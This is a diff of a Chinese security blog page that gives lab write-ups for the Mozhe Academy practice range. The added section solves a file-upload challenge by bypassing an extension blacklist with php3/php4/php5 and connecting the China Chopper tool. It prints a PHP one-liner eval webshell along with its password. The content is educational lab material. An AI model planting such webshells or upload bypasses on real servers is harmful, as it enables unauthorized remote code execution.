@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="SpongeB0B&#39;s Blog">
 <meta property="og:description" content="最近发现墨者学院的一些在线靶场很不错，大部分也都免费，看了一下，很多靶场也是别的平台和比赛没有，对于学习者来说难度逐步提高，阶梯很合理，对新手特别友好，所以就注册了一下玩一下。官网地址，对于web安全，我也是萌新，会嘤嘤嘤的那种（都说越菜越萌），那就从入门题开始，一步一步来。由于七牛云还没实名认证，编辑器不带图床，所以简单就不上图了，就写一下解题步骤。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-08-21T10:02:39.188Z">
+<meta property="og:updated_time" content="2018-08-22T03:42:45.403Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="墨者学院在线靶场writeup">
 <meta name="twitter:description" content="最近发现墨者学院的一些在线靶场很不错，大部分也都免费，看了一下，很多靶场也是别的平台和比赛没有，对于学习者来说难度逐步提高，阶梯很合理，对新手特别友好，所以就注册了一下玩一下。官网地址，对于web安全，我也是萌新，会嘤嘤嘤的那种（都说越菜越萌），那就从入门题开始，一步一步来。由于七牛云还没实名认证，编辑器不带图床，所以简单就不上图了，就写一下解题步骤。">
@@ -229,6 +229,7 @@ var _hmt = _hmt || [];
 <h6 id="利用畸形目录"><a href="#利用畸形目录" class="headerlink" title="利用畸形目录"></a>利用畸形目录</h6><p>在<code>XP</code>系统可以使用<code>md xx..\</code>命令，带<code>.</code>的文件夹（亦称畸形目录），需要看的时候用运行命令打开。<br>但是在<code>WIN7</code>中这个方法失灵了，但是只要知道畸形目录的真实DOS（8.3格式）名称即可。如何查看真实名称？<br>用带<code>/x</code>参数的<code>dir</code>命令即可。<br>列如在F盘的<code>abc</code>文件夹下有个畸形目录<code>g..\</code>(显示为g.文件夹)，运行<code>dir /x f:\abc</code>找到<code>g.</code>的行可以看到畸形文件夹的真实<code>DOS</code>名称是<code>GE276~1</code>,然后打开<code>运行</code>输入<code>f:\abc\ge276~1</code>并回车，即可打开这个畸形目录。</p>
 <h3 id="远程电子数据取证-木马分析-第3题"><a href="#远程电子数据取证-木马分析-第3题" class="headerlink" title="远程电子数据取证-木马分析(第3题)"></a>远程电子数据取证-木马分析(第3题)</h3><p>就是利用<code>畸形目录</code>先搜索<code>888.</code>，找到真实<code>DOS名称</code>，为<code>888~1</code>，通过上述方法打开，就拿到key了</p>
 <h3 id="远程电子数据取证-木马分析-第4题"><a href="#远程电子数据取证-木马分析-第4题" class="headerlink" title="远程电子数据取证-木马分析(第4题)"></a>远程电子数据取证-木马分析(第4题)</h3><p>和第二题一样，先把文件夹选项里的隐藏文件打开,进入 <code>/windows/sysytem32LogFilesW3SVC1</code>目录查看日志，发现key文件(搜索key),然后<code>type \\.\C:\Inetpub\wwwroot\lpt6.key_shell.asp</code></p>
+<h3 id="WebShell文件上传漏洞分析溯源-第1题"><a href="#WebShell文件上传漏洞分析溯源-第1题" class="headerlink" title="WebShell文件上传漏洞分析溯源(第1题)"></a>WebShell文件上传漏洞分析溯源(第1题)</h3><p>上传图片显示<code>文件上传成功保存于：uploads/timg.jpg</code> ，换成<code>php</code>文件显示<code>此文件不允许上传</code>，根据题目提示是黑名单绕过，将文件后缀改成<code>php3</code>|<code>php4</code>|<code>php5</code>即可成功上传，然后菜刀连接(实际环境小心菜刀后门，被黑吃黑)，在菜刀中右键<code>添加</code>，然后在地址处输入：<code>http://219.153.49.228:47414/uploads/xxx.php5</code>然后输入密码，php文件中的代码为<code>&lt;?php @eval($_POST[AA])?&gt;</code>，密码则是<code>AA</code><br>常见PHP一句话</p>
 
       
 
@@ -379,6 +380,15 @@ var _hmt = _hmt || [];
   
 <nav id="article-nav">
   
+    <a href="/2018/08/22/常见一句话木马大全/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          常见一句话木马大全
+        
+      </div>
+    </a>
+  
   
     <a href="/2018/08/10/Git使用笔记/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">Git使用笔记</div>
@@ -408,7 +418,7 @@ var _hmt = _hmt || [];
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#入门"><span class="toc-number">1.</span> <span class="toc-text">入门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB页面源代码查看"><span class="toc-number">1.0.1.</span> <span class="toc-text">WEB页面源代码查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务器返回数据查看"><span class="toc-number">1.0.2.</span> <span class="toc-text">服务器返回数据查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览器信息伪造"><span class="toc-number">1.0.3.</span> <span class="toc-text">浏览器信息伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#登录密码重置漏洞分析溯源"><span class="toc-number">1.0.4.</span> <span class="toc-text">登录密码重置漏洞分析溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#热点评论刷分漏洞分析溯源"><span class="toc-number">1.0.5.</span> <span class="toc-text">热点评论刷分漏洞分析溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#投票常见漏洞分析溯源"><span class="toc-number">1.0.6.</span> <span class="toc-text">投票常见漏洞分析溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#来源页伪造"><span class="toc-number">1.0.7.</span> <span class="toc-text">来源页伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP动作练习"><span class="toc-number">1.0.8.</span> <span class="toc-text">HTTP动作练习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP地址伪造-第1题"><span class="toc-number">1.0.9.</span> <span class="toc-text">IP地址伪造(第1题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP地址伪造-第2题"><span class="toc-number">1.0.10.</span> <span class="toc-text">IP地址伪造(第2题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第1题"><span class="toc-number">1.0.11.</span> <span class="toc-text">远程电子数据取证-服务器分析(第1题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第2题"><span class="toc-number">1.0.12.</span> <span class="toc-text">远程电子数据取证-服务器分析(第2题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第3题"><span class="toc-number">1.0.13.</span> <span class="toc-text">远程电子数据取证-服务器分析(第3题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第4题"><span class="toc-number">1.0.14.</span> <span class="toc-text">远程电子数据取证-服务器分析(第4题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第5题"><span class="toc-number">1.0.15.</span> <span class="toc-text">远程电子数据取证-服务器分析(第5题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第6题"><span class="toc-number">1.0.16.</span> <span class="toc-text">远程电子数据取证-服务器分析(第6题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第7题"><span class="toc-number">1.0.17.</span> <span class="toc-text">远程电子数据取证-服务器分析(第7题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第1题"><span class="toc-number">1.0.18.</span> <span class="toc-text">远程电子数据取证-木马分析(第1题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第2题"><span class="toc-number">1.0.19.</span> <span class="toc-text">远程电子数据取证-木马分析(第2题)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#利用保留字隐藏"><span class="toc-number">1.0.19.0.0.1.</span> <span class="toc-text">利用保留字隐藏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#利用clsid隐藏"><span class="toc-number">1.0.19.0.0.2.</span> <span class="toc-text">利用clsid隐藏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#利用注册表隐藏"><span class="toc-number">1.0.19.0.0.3.</span> <span class="toc-text">利用注册表隐藏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#利用畸形目录"><span class="toc-number">1.0.19.0.0.4.</span> <span class="toc-text">利用畸形目录</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第3题"><span class="toc-number">1.0.20.</span> <span class="toc-text">远程电子数据取证-木马分析(第3题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第4题"><span class="toc-number">1.0.21.</span> <span class="toc-text">远程电子数据取证-木马分析(第4题)</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#入门"><span class="toc-number">1.</span> <span class="toc-text">入门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB页面源代码查看"><span class="toc-number">1.0.1.</span> <span class="toc-text">WEB页面源代码查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务器返回数据查看"><span class="toc-number">1.0.2.</span> <span class="toc-text">服务器返回数据查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览器信息伪造"><span class="toc-number">1.0.3.</span> <span class="toc-text">浏览器信息伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#登录密码重置漏洞分析溯源"><span class="toc-number">1.0.4.</span> <span class="toc-text">登录密码重置漏洞分析溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#热点评论刷分漏洞分析溯源"><span class="toc-number">1.0.5.</span> <span class="toc-text">热点评论刷分漏洞分析溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#投票常见漏洞分析溯源"><span class="toc-number">1.0.6.</span> <span class="toc-text">投票常见漏洞分析溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#来源页伪造"><span class="toc-number">1.0.7.</span> <span class="toc-text">来源页伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP动作练习"><span class="toc-number">1.0.8.</span> <span class="toc-text">HTTP动作练习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP地址伪造-第1题"><span class="toc-number">1.0.9.</span> <span class="toc-text">IP地址伪造(第1题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP地址伪造-第2题"><span class="toc-number">1.0.10.</span> <span class="toc-text">IP地址伪造(第2题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第1题"><span class="toc-number">1.0.11.</span> <span class="toc-text">远程电子数据取证-服务器分析(第1题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第2题"><span class="toc-number">1.0.12.</span> <span class="toc-text">远程电子数据取证-服务器分析(第2题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第3题"><span class="toc-number">1.0.13.</span> <span class="toc-text">远程电子数据取证-服务器分析(第3题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第4题"><span class="toc-number">1.0.14.</span> <span class="toc-text">远程电子数据取证-服务器分析(第4题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第5题"><span class="toc-number">1.0.15.</span> <span class="toc-text">远程电子数据取证-服务器分析(第5题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第6题"><span class="toc-number">1.0.16.</span> <span class="toc-text">远程电子数据取证-服务器分析(第6题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第7题"><span class="toc-number">1.0.17.</span> <span class="toc-text">远程电子数据取证-服务器分析(第7题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第1题"><span class="toc-number">1.0.18.</span> <span class="toc-text">远程电子数据取证-木马分析(第1题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第2题"><span class="toc-number">1.0.19.</span> <span class="toc-text">远程电子数据取证-木马分析(第2题)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#利用保留字隐藏"><span class="toc-number">1.0.19.0.0.1.</span> <span class="toc-text">利用保留字隐藏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#利用clsid隐藏"><span class="toc-number">1.0.19.0.0.2.</span> <span class="toc-text">利用clsid隐藏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#利用注册表隐藏"><span class="toc-number">1.0.19.0.0.3.</span> <span class="toc-text">利用注册表隐藏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#利用畸形目录"><span class="toc-number">1.0.19.0.0.4.</span> <span class="toc-text">利用畸形目录</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第3题"><span class="toc-number">1.0.20.</span> <span class="toc-text">远程电子数据取证-木马分析(第3题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第4题"><span class="toc-number">1.0.21.</span> <span class="toc-text">远程电子数据取证-木马分析(第4题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell文件上传漏洞分析溯源-第1题"><span class="toc-number">1.0.22.</span> <span class="toc-text">WebShell文件上传漏洞分析溯源(第1题)</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -561,30 +571,6 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">docker</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">容器</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">镜像</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Dockerfile</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
@@ -634,6 +620,50 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">webshell</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">asp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">aspx</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">jsp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">一句话马</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">docker</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">容器</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">镜像</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Dockerfile</a>
               </li>
             
             <div class="clearfix"></div>
